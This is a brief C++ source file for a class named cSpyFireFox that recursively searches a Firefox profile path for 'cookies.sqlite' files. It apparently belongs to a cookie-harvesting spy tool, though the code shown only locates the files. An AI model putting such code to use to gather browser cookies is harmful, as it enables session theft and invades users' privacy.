#include "cSpyFireFox.h"
#include "sConstants.h"
#include "sFileHelper.h"
cSpyFireFox::cSpyFireFox() :
IBrowser(sConstants::ROOT_PATH_COOKIES_FIREFOX)
{

}
void cSpyFireFox::searchCookies(vector<string> &p_refvtstrCookiesPath)
{
	sFileHelper::getFilesR(m_cstrCookiesPath, p_refvtstrCookiesPath, "cookies.sqlite");	
}